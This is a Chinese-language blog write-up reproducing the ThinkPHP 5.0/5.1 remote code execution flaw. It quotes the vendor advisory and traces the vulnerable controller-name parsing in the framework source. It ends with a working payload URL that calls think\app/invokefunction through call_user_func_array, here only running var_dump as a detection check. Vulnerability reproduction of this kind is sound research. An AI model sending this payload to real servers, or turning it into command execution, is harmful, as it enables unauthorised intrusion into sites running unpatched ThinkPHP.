categories:
- cve复现
tags:
- cve复现
title: tp5rce复现
---
# tp5rce复现

## 影响范围

>### 本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。
>
>**如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。**
>
>--来自thinkphp官网



## 漏洞原理

根据官方的公告去寻找相关commit发现漏洞位置

![image302](https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png)



查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的

```php
	public function exec()
    {
        // 监听module_init
        $this->app['hook']->listen('module_init');

        try {
            // 实例化控制器
            $instance = $this->app->controller($this->controller,
                $this->rule->getConfig('url_controller_layer'),
                $this->rule->getConfig('controller_suffix'),
                $this->rule->getConfig('empty_controller'));

            if ($instance instanceof Controller) {
                $instance->registerMiddleware();
            }
        } catch (ClassNotFoundException $e) {
            throw new HttpException(404, 'controller not exists:' . $e->getClass());
        }
    ...
    }
```

跟进controller

```php
    public function controller($name, $layer = 'controller', $appendSuffix = false, $empty = '')
    {
        list($module, $class) = $this->parseModuleAndClass($name, $layer, $appendSuffix);

        if (class_exists($class)) {
            return $this->__get($class);
        } elseif ($empty && class_exists($emptyClass = $this->parseClass($module, $layer, $empty, $appendSuffix))) {
            return $this->__get($emptyClass);
        }

        throw new ClassNotFoundException('class not exists:' . $class, $class);
    }
```

再跟进parseModuleAndClass

```php
protected function parseModuleAndClass($name, $layer, $appendSuffix)
    {
        if (false !== strpos($name, '\\')) {
            $class  = $name;//存在\
            $module = $this->request->module();
        } else {
            if (strpos($name, '/')) {
                list($module, $name) = explode('/', $name, 2);
            } else {
                $module = $this->request->module();
            }

            $class = $this->parseClass($module, $layer, $name, $appendSuffix);
        }

        return [$module, $class];
    }
```

如果存在\则直接返回数据,其中`$name`是我们可控内容,而`$name`也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作

## 漏洞利用

查找手册,找到url访问的具体细节

`http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]`

于是有通杀tp5.0.x和tp5.1.x的检测payload

` http://127.0.0.1/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=checktp5rce `

